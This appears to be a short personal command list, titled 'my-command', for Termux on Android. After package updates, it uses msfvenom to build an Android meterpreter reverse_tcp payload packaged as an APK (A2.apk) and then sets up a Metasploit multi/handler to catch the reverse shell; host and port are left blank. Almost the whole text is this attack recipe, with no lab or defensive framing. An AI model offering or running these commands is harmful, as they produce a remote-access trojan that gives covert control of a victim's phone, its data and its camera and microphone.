# my-command
Termux
apt update && apt upgrade -y
termux-setup-storage
ls
msfvenom -p android/meterpreter/reverse_tcp LHOST= LPORT= -o,/sdcard/A2.apk

msfconsole
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set lhost 
set lport
exploit
